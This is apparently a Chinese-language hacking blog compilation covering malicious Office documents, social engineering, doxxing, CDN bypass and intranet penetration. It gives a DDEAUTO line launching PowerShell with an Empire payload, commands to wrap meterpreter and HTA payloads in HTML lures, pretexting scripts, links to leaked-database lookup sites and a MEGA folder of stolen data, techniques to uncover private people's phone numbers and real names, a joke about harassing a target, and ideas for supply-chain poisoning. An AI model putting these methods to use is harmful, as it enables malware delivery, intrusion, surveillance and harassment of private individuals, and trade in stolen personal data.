![在这里插入图片描述](https://img-blog.csdnimg.cn/5aa3f2c76321493bb5269e08a24289da.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


如前所述，宏文件方法是一种久经考验的旧方法，因此很多受害者已经对这种攻击有了一定的认识。利用 Office 文件的另一种思路是将我们的 payload 嵌入一个批处理文件(.bat)。但在较新版本的 Office 中，如果受害者双击 Word 文档中的 .bat 文件，对象则不会被执行。我们通常不得不试图诱导受害者使其将 .bat 文件移动到桌面并执行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/bb5d49c642b04e52b37b91252979c1b9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
我们可以用 LuckyStrike 来以更自动化的方式完成此操作。通过使用 LuckyStrike，我们可以在工作表中使用 Payload 创建 Excel 文档，甚至可以在 Excel 文档中存储完整的可执行文件（exe），这些文件可以用 ReflectivePE 来触发从而在内存中运行。阅读更多关于 LuckyStrike 的内容：
https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator

我想提到的用于 Office 文件执行的最后一个工具是 VBad。运行 VBad 时，必须在 Office 中启用宏，并在宏安全设置的下拉框中选择 “信任对 VBA 项目对象模型的访问” 选项。这会允许 VBad 运行 python 代码来更改并创建宏。

VBad 会严重混淆 MS Office 文档中的 payload。它还增加了加密功能，用假密钥来迷惑应急响应团队。最重要的是，它可以在第一次成功运行后销毁加密密钥（VBad 是一个一次性使用的恶意软件）。另一个特性是 VBad 也可以销毁对包含有效 payload 的模块的引用，以使其从 VBA 开发者工具中不可见。这使得分析和排除故障变得更加困难。因此，不仅很难去逆向，而且如果应急响应团队尝试分析执行的 Word 文档与原始文档，则所有密钥都将丢失。
![在这里插入图片描述](https://img-blog.csdnimg.cn/acf3c4e334fd4dcdb180b236b13260df.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
#### 非宏的 Office 文件 —— DDE
 DDE 是全新易受攻击模块。杀毒软件或任何安全产品还尚未检测到它，因此这是获得我们初始入口点的好方法。 虽然现在有几种安全产品可以检测 DDE ，但在某些环境中它仍然可能是一种可行的攻击。

什么是 DDE？
“ Windows 提供了几种在不同的应用程序之间传输数据的方法。其中一种方法就是使用动态数据交换（DDE）协议。DDE 协议是一组消息和指南。它在共享数据的应用程序之间发送消息，并使用共享内存在应用程序之间交换数据。应用程序可以使用 DDE 协议进行一次性数据传输。并且应用程序也可以利用 DDE 协议来进行持续的数据交换，当新数据可用时候，应用程序可以通过持续的数据交换来彼此发送更新。”https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx

Sensepost 的团队做了一些很棒的研究，发现 MSExcel 和 MSWord 都暴露了 DDEExecute，并且可以在不使用宏的情况下创建代码执行。
在 Word 中：

转到“插入”选项卡 -> “快速部件” -> “字段”
选择 = 公式
右键单击：!Unexpected End of Formula 并选择 Toggle Field Codes
将 payload 替换为你的 payload：

```bash
DDEAUTO c:\windows\system32\cmd.exe “/k powershell.exe [empire payload here]”
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/004d1be057bf4efe8e590a995d5cdcff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
Empire 有一个 stager ，可以自动创建 Word 文件和关联的 PowerShell 脚本。 此 stager 可以通过以下方式配置：

usestager windows/macroless_msword
![在这里插入图片描述](https://img-blog.csdnimg.cn/548b1e740bed427b81fe538f57871489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
除了 0day 漏洞利用（例如 https://github.com/bhdresh/CVE-2017-0199 ）之外，Word 文档中是否还有其他任何能利用的特性呢？ 答案是肯定的。其中一个例子是 subdoc attacks。这些攻击导致受害者向网络上的攻击服务器发出 SMB 请求，以便收集 NTLM Auth Hash（NTLM 验证哈希）。 这种攻击并不是在所有场景里百分百生效，因为大多数公司现在阻止 SMB 相关端口连接外网。对于那些还未进行此种配置的公司，我们可以使用 subdoc_inector 攻击来利用这种错误配置。
#### 隐藏的加密 payload
作为红队队员，我们一直在寻求使用创造性的方法来构建我们的登陆页面，加密我们的 payload，并诱导用户点击运行。具有类似过程的两个不同工具是 EmbededInHTML 和 demiguise。

第一个工具 [EmbededInHTM](https://github.com/Arno0x/EmbedInHTML)，该工具的描述是“ 获取文件（任何类型的文件），加密它，并将其作为资源嵌入到 HTML 文件中，还包含模拟用户点击嵌入资源之后的自动下载进程。然后，当用户浏览 HTML 文件时，嵌入式文件即时解密，保存在临时文件夹中，然后将文件展示给用户。这一系列过程会让用户感觉该文件像是从远程站点下载来的。基于用户的浏览器和显示的文件类型，浏览器可以自动打开文件。”

```bash
cd /op/EmbedInHTML
python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8a07ec8b11394556993f87988ae8da08.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
一旦受害者访问恶意站点，弹出的窗口会提示受害者在 Excel 中打开我们的.xll文件。不幸的是，对于最新版本的 Excel（除非配置错误），用户需要启用加载项来执行我们的 payload 。这就需要使用你在前面学到的社会工程学技巧了。

第二个工具是 demiguise，描述是“ 生成包含一个加密的 HTA 文件的 .html 文件。该工具的思路是，当你的目标访问该页面时，将获取其密钥并在浏览器中动态解密 HTA 然后将其直接推送给用户。这是一种隐匿技术，可以绕过由某些安全设备进行的的内容/文件类型的检查。但是此工具并不是为了创建优秀的 HTA 内容而设计的。在 HTA 内容方面还有其他工具/技术可以帮助你。demiguis 希望帮助用户的是:首先让你的 HTA 进入一个环境，并且（如果你使用环境键控）避免它被沙盒化。

```bash
python demiguise.py -k hello -c “cmd.exe /c ” -p Outlook.Application -o test.hta
```

#### 钓鱼 wifi






### 定向社工

> * 加好友
>   拿老师电话

>时间：2007-3-14 19：52 门卫部 道具：<<C++ Primer>> 冒称身份：学生李勇
>李勇：你好，我是C323班李勇。 
>门卫A：什么事？ 
>李勇：是这样的，昨天借了老师的一本书，但我忘记他的联系方式。 
>门卫B：哦，在桌子上压着，自已看。 
>李勇：我找找下。 
>李勇：唉，没找到，但我看见几个认识的老师的电话号码，我可以拿着拷贝一份吗？ 
>门卫A：不可以! 
>门卫B：你去学生科找找看吧。 
>李勇：好吧，谢谢。

**收集情报**
**获得公司ip，邮箱地址**对公司攻击时，找到销售邮箱，显示对产品感兴趣。当销售回邮件时可以分析邮件头真实ip，邮箱服务器地址
**域劫持** 当破解成功一位员工的密码时，请求管理员修改密码，这时候将会能对域进行劫持
**趋势**
网络安全防火墙被越来越多的公司重视，技术攻击可能会变得更难，但社会工程学利用人性做一些简单的工作就可以拿到更高机密的东西。社会工程学实施者就是所谓骗子，毕竟这不是什么有道德的事情，那下文就对这类人直称骗子。
**骗子特性**
低调，即便劣迹斑斑，却不会对任何人承认劣迹，就像蜜罐不愿意告诉苍蝇这里有危险。
十分重视表面看上去无利害的信息。
**生活中骗子**
如果骗子是在某行业混久了发现行业的漏洞，那么他是个不足够灵活的骗子。对于很多熟练如何行骗的人，都是先盯上某行发现其有大收益，接下来在对此内部人员调研更多信息。
**打探信息**
	对于打探更多的信息，这些信息收集通常都是敏感的，这时候你需要**给自己另一个身份**，比如你是记者、或在写一本调查书、或你是大学生需要得到一些信息、或你是内部员工或你是公司产品售后寻求调研。**打探信息第一步是**收集专业术语，如果收集信息遇到的人足够配合甚至可以问更多细节，否则在对方怀疑时就要停止问敏感信息。
	**如何知道对方是否产生怀疑**，试着问对方一个私人问题，比如：“你在这里工作多久了？”
	何时挂断电话，在问完关键问题时候，千万不要马上结束谈话，多问两三个关键问题，因为人最可能想起的是最后一个问题。



## 如何在本地查询

上面两个步骤的方法，只可查询的部分数据是因为数据总量非常大，不适合放在公网。其来源于 Telegram 电报群。它是放在 mega nz 网盘里面的，我也就把转存在自己的网盘里面了。在 MEGA NZ 网盘上分享由黑客盗取的数据库/密码是违反网盘存放规定的，若被举报，此处链接将不再补新。同时我也会失去账号以及源文件，但是对我损失不是很大，我再也不想拥有上帝之眼了。

```
https://mega.nz/folder/H54izYIIQ9zJBCd8uIpmqCAd7DGf3w
```


普通记事本文件是无法打开如此庞大的 txt 文件的，更别谈快速索引了。因此需要安装这款比较专业的软件。建议需要在超级固态硬盘的电脑上面使用，不然也是非常慢的。

```
https://www.emeditor.com/download/
```


其他一些社工库

http://shenkur/passd/

http://scnitpr/

http://cnseur/frumphp

开房记录：http://594skcm/
![在这里插入图片描述](https://img-blog.csdnimg.cn/202105061748366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

# 经验
## 知名网站
这与中小型网站渗透不太一样，中小型的可能以下方案/工具对目标帮助不大，而前面提到的很多常规工具又对他们的自定义WAF失效，所以我就增加了这一小节，希望能帮助到你一点吧。
扫这个网站向我们显示有关所发现的攻击，恶意网站或错误的信息 https://www.greynoise.io/viz/query
## IP伪造
通过互联网传输的数据首先被分成多个数据包，这些数据包独立传输并在最后重新组合。每个数据包都有一个 IP（互联网协议）标头，其中包含有关数据包的信息，包括源 IP 地址和目标 IP 地址。如果ip判定是从请求数据包进行判定的，这样就有可能存在伪造ip绕过的情况。
 **前端验证绕过**
以下方法已经快被淘汰
X-remote-IP:是远端IP，默认来自tcp连接客户端的Ip。可以说，它最准确，无法修改，只会得到直接连服务器客户端IP。如果对方通过代理服务器上网，就发现。获取到的是代理服务器IP了。
HTTP_CLIENT_IP 在高级匿名代理中，这个代表了代理服务器IP。
HTTP_X_FORWARDED_FOR = clientip,proxy1,proxy2其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。可以传入任意格式IP.这样结果会带来2大问题，其一，如果你设置某个页面，做IP限制。 对方可以容易修改IP不断请求该页面。 其二，这类数据你如果直接使用，将带来SQL注册，跨站攻击等漏洞
**TOR**
类似于分布式的 VPN。太慢了！！等你用成一个黄花菜都凉了

**选购代理**





### 攻破类似网站

当你攻破一个网站时，复制并百度其类似的目录结构（打开F12--》network，分析请求地址即可得到），就可以得到同源码搭建的网站。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628123827814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 如何攻击更多人

盗取开发者账号替换正规应用

发布知名应用仿冒品

重打包技术

第三方下载站点

通过共享资源社区

破解软件联盟组织

SEO优化方式劫持搜索引擎结果，引导大众下载恶意软件

攻击主流的软件包如PYPI，npm,Docker hub...投放大量相似拼写相似的

攻击者通过分析特定行业的知名软件、项目、抢对应域名、模仿官网。并进行汉化版下载链接

下载节点缓存、CDN  缓存、P2P  缓存、城域网缓存，被投毒污染
当前互联网体系下，硬件、软件、物联网 OT 设备的更新和数据分发，均依赖网络基础设施来承
载，当终端客户进行更新、下载时通过网络链路拉取，网络基础设施为了提升效率节省成文，会对一些资源进行缓存。攻击者可通过定向污染缓存来实现投毒，最终攻击终端用户。

软件、硬件产品在发展的过程中，为了提升产品体验、升级能力、修复 BUG 等，需要进行更新升级，供应商因此建设有配套的更新升级系统。黑客通过自身的攻击能力与掌握的漏洞，对供应商发起攻击与横向渗透，最中取得升级系统的控制权。利用窃取或伪造证书签名的软件更新，将恶意软件带进攻




#### 网站信息查询

接下来，查询一下whois信息：信息查询出来后没有注册电话显示，还需要进一步查询。
邮箱反查
通过whois查询到的邮箱进行一波反查注册过该邮箱域名地址：发现该邮箱还注册了另一个站点。

相关网站
对邮箱反查后的站点进行访问后得到。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520164745383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 溯源

这个技巧可以用在获得更多信息中，也可以用在反攻击中，即找出黑客是谁。
![在这里插入图片描述](https://img-blog.csdnimg.cn/202107011702168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 很强大的溯源工具

https://www.feiliuwl.cn/go/?url=http://qb-api.com/ 或者 https://qb-api.com   本站更换主域名为sgk.xyz！！网站不稳定。
18781615044
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616113445248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701170010902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


这个网站找到电话也可以 https://pig8.iculture.cc/


#### 已知名字

https://cn.linkedin.com/pub/dir?lastName=&firstName=名&trk=public_profile_people-search-bar_search-submit

#### 已知邮箱
**reg007/0xreg**。可以查看目标用户使用这个邮箱还注册了哪些网站
针对获得的这些信息做钓鱼

##### 获取电话号码

也可以先用reg007找到公开的注册网站。记住记住！！！有的网站可能会在在你没有准备下一步要发送密码时，就已经发送邮箱或者短信了，无疑会打草惊蛇，因此你需要先用你的账号密码进行测试。
通过“密码找回”获取手机号片段：

大多数人会使用相同的邮箱相同的手机号注册微信、[微博](https://security.weibo.com/iforgot/loginname?entry=weibo&loginname=%E9%82%AE%E7%AE%B1/%E4%BC%9A%E5%91%98%E5%B8%90%E5%8F%B7/%E6%89%8B%E6%9C%BA%E5%8F%B7)、京东、淘宝、支付宝、携程、豆瓣、大众点评等应用。在“找回密码”页面输入已知的邮件地址：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609213557341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

我试验了大部分热门应用的密码重置过程，大致如此，有的是前两位后四位，有的是前三位和后两位……。没有标准，屏蔽位数完全由企业和开发人员决定。

第二步：使用公开数据库筛选：

为什么公布个人信息时一般是隐藏中间4位号码？目前我国手机号码格式为：3位网号 +4位HLR识别号+4位用户号码。

 139-1234-5678

其中139代表运营商（移动），5678是用户号码。1234是HSS/HLR识别码，或者叫地区编码，相当于你手机归属地的运营商服务器编号，记录了客户数据，包括基本资料、套餐、位置信息、路由以及业务状态数据等等。比如1391234是移动江苏常州的HLR编号，1301234是联通重庆的HLR编号。

在网上可找到每月更新的手机归属地数据库，字段包括省份、城市、运营商等信息
假如我知道张三常住北京，根据数据库筛选结果，158移动目前北京有230个号段，1580100~1580169,1581000~1581159。

待筛选号码剩下230个。

如果是其他省市，158XXXX，上海有210个，成都有170个，西安有108个。如果是二级城市，范围就更小了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609214656281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609214801690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060921493650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609215132796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


筛选电话号码这一小节摘抄自 https://mp.weixin.qq.com/s?__biz=MzI3NTExMDc0OQ==&mid=2247483802&idx=1&sn=e4317bcbc3e78ddf4c2715298ef197f2&scene=21#wechat_redirect

#### IP 定位
**IP**

1. 高精度 IP 定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspx
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701231210744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


3. ipplus360 （IP 查询）：http://www.ipplus360.com/ip/
4. IP 信息查询：https://www.ipip.net/ip.html/
5. IP 地址查询在线工具：https://tool.lu/ip/

#### 已知电话号码

**查姓名**
可直接搜索支付宝
如果你不介意被对方发现，你可以直接通过支付宝转账，使用银行卡付款。
然后在你的银行卡客户端查询订单，订单详情的支付场所：XXX，会显示对方的全名
社交账户：（微信、QQ）等
注意：获取手机号如果自己查到的信息不多，直接上报钉钉群（利用共享渠道对其进行二次社工）

通过手机号查询他注册了哪些网站 http://www.newx007.com/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210615201723930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
等于获得了微信

##### 查询社交账号

**qq号**
接口地址：https://cxx.yun7.me/qqphone
返回格式：json
请求方式：get/post
请求示例：https://cxx.yun7.me/qqphone?phone=18888888888
请求参数说明：

返回示例：

{
	"status": 200,
	"message": "查询成功",
	"qq": "336699",
	"phone": "18888888888",
	"phonediqu": "福建省金门市移动"
}

#### 社交账号

##### 查询照片EXIF

https://www.gaitubao.com/exif

#### 已知QQ号

```
https://qq.pages.dev/
```

通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台
去腾讯\新浪微博搜索
通过微信搜索
查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)
通过说说、留言、日志找到其好友
加QQ钓鱼\共同好友\可能认识的人

##### 查询地址

https://www.iculture.cc/sg/pig=291

##### 查询电话号

qq点找回密码，其他与前文已知邮箱操作相同

你获得这个人电话了，要是想恶搞他就用他号码注册n个奇怪的网站，账号名还用实名。哈哈哈

##### 加被害者

钓鱼，查询对方上网地址 https://jingyan.baidu.com/article/6181c3e084fb7d152ef15385.html

#### 社工库

 http://site3.sjk.space/# 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
5e
5e指的是微博泄露的5亿微博uid与绑定手机相关联的数据
准确的5e是503925366条数据

8e
8e指的是QQ泄露的8亿QQ与初始绑定手机相关联的数据
准确的8e是有719806832条数据

16e
16e指的是整合的16亿数据
市面上没有纯16亿的QQ数据

如果声称有的100%是骗子
大概组成
4亿老密码和4亿QQ绑定的数据
8亿邮箱绑定的数据（包括手机和密码）

在线社工库
https://www.iculture.cc/pizzahut

## 绕过CDN
试图获取真实ip,对于中小型网站这是简单的，对于大型如百度、腾讯这是几乎不能成功的。
**有CDN吗**
小型网站可以尝试用nslookup来查询ip，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。
或者你通过多地ping看返回的ip是否一样来验证是不是有CDN。这个在站长之家的超级ping工具可以获得显示 http://ping.chinaz.com 使用此工具的时候注意你输入ww.XXX.com与XXX.com解析结果很可能是不同的。这取决于管理员对网站的设置。
如下是ww.XXX.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153333683.png)
和XXX.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153405923.png)
看看在后台的设置可以知道
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153456929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
但如果你用浏览器访问XXX.com，浏览器会自动给你加上www,导致你也许错误认为这两者对于真实的解析没有区别

**真实ip作用**
使用CDN的网站，如果你没有获得其真实的服务器ip地址，那么你对虚假地址的攻击只能是无效工作。虚假地址就像是对真实地址的一个缓存

1. 获取更多信息

> 信息量更多的扫描目录结果。我在测试某站点的一级域名目录与真实IP

3. 做攻击

>可洪水攻击、得到真实IP可以直接进行云WAF绕过；一般来说信息搜集的最主要最靠的步骤就是找出真实IP

**查询方法**
查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：
https://dnsdb.io/zh-cn/
https://x.threatbook.cn/
https://censys.io/ipv4?q=baidu.com
非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。
http://viewdns.info

同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。
https://site.ip138.com/

庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。
http://iphostinfo.com
注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。

浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip

1. 查询子域名。对子域名进行ip扫描。但这会有三种情况，一种是子域名与主域名同个ip,或同个网段，或完全不同的ip

2. 耗尽CDN资源/以量打量。CDN付费是比如100M流量购买，所以如果你通过请求访问完网站的CDN那么你将会获得真实的ip
3. ip历史记录解析查询法。
   有的网站是后来才加入CDN的，所以只需查询它的解析历史即可获取真实ip，这里我们就简单介绍几个网站：微步在线dnsdb.ionetcraft(http://toolbar.netcraft.com/),Viewdns(http://viewdns.info/)等等。

4. 网站漏洞查找法
   通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。

5. 网站订阅邮件法
   利用原理：邮件服务器 大部分不会做CDN 利用注册，因为邮箱一般都是给内部人使用的，且一般邮箱都是主动给人发比如找回密码等邮件，当客户邮箱收到你的邮件时这时候会自动同个ip识别是不是垃圾邮件是不是官方邮件。使用方法：找回密码等网站发送邮件进行验证，获取验证码，查看邮件代码获取IP地址。
   如下是foxmail
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629164915844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629165428490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

6. 网络空间引擎搜索法
   常见的有以前的钟馗之眼，shodan(https://www.shodan.io/)，fofa搜索(https://fofa.so/)。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。
   利用网络空间搜索时，你还可以先获取一个网站的ico的hash值，将hash值在空间搜索引擎中查找
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171639945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171847888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


8. F5 LTM解码法
   当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。

9. 国外地址请求

利用原理：开发员认为用户群体主要在国内，因此只针对于中国地区进行cdn防护,没有部署国外访问的CDN的访问节点
(1)利用国外ping对目标进行ping检测（尽量使用少见国家）
(2)利用VPN全局代理利用CMD进行PING检测

如图是使用工具进行多个国家ping结果 https://whoer.net/zh/ping
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629163852104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
https://tools.ipip.net/dns.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701225359245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

9. 对网站的APP抓包,
10. 使用全网扫描工具比如：fuckcdn,w8fuckcdn,zmap；但是这些工具都不太好用
    首先从 apnic 网络信息中心获取ip段，然后使用Zmap的 banner-grab 对扫描出来 80 端口开放的主机进行banner抓取，最后在 http-req中的Host写我们需要寻找的域名，然后确认是否有相应的服务器响应。

11. 第三方扫描平台，输入链接即可查找  https://get-site-ip.com/
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629160737324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
    或者 https://s.threatbook.cn/![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629161729418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**最终确认**
你可能通过不同方法查询后将会获得多个ip作为可怀疑对象，这时候你需要最终确认ip所在地

12. 查询ip地址所在地。观察网页归属地。或者更深入你的你应该查询管理员属于哪里人公司位于哪里云云
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629165616321.png)
13. 修改host文件中的www.xxx.com和xxx.com文件，用ping确定后再访问看能否打开网页
14. 直接在网页中访问IP地址  

# 内网渗透
## 基础
内网也指局域网，即一个区域内多台计算机互联的计算机组。局域网可以实现共享文件、打印机等
大多数为了安全都公司设置了公司内网。这时候如下图所示，当黑客成功越过第一道防火墙后，还有一堵墙，即进入了demilitarized zone（DMZ）。内网渗透的目的是穿过DMZ到内网。内网通常有专门管理文件的、网站服务器、个人PC机等。

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/26d3bec2b841ffece0ae7778589a52ab.png)
从技术复杂度与功能上来说，windows比linux更适合做AD域。因此一般来说内网攻击是指的对windows系统。
内网渗透你需要运用提权知识将你的权限提至于adminstartor，因为很多内网渗透工具是需要adminstartor权限才可以运行。域与域之间在没有建立信任关系下是不能访问的

**术语**
工作组：平级。每台计算机都是独立的，每台计算机一开始都默认分配了工作组。
域环境： 非平级。比如机房上课老师统一控制电脑
域控制器(DC)：类似于域管理员身份
活动目录(AD):活动目录将所有的计算机当做像文件夹一样的访问。域控制器就是因为有了AD所以能控制别人电脑

本地域组：本域成员只能访问本域。本地域组其中管理员组拥有最高权限
全局组：本域成员可以跨域访问。类似于你拥有特权后可以访问外网。域管理组所在位置
通用组：他域+本域成员可以跨域访问。
**重点：流程**
可以用lodan一键代替
起点是获得了跳板机（域下某个用户）本地用户权限user，目标是拿下DC域下其他用户。
当我们获得跳板机的user，先进行提权到admins权限。如果你非不想提权，在未打KB2871997补丁情况下就可以用PTH连接；已打补丁用PTK。（本文未介绍此方法，具体自行参考百度）
信息搜集：搜集所属域下其他计算机名，ip,是否开放445/135；搜集本机adminstor明文密码，没有明文收集个hash密码也是可以的。
建立爆破字典：自定义+常用字典，对其他计算机进行密码爆破。
爆破成功后一组就可以进行控制上传木马等操作了。
*补充：流程很可能还会用到免杀等技巧；如果跳板机存在MS14-068则直接利用user权限就可以获得自己提升到域管权限*

**windows常见身份**
系统默认常见用户身份：
Domain Admains：域管理员（默认对域控制器有完全控制权）
Domain Computers：域内机器
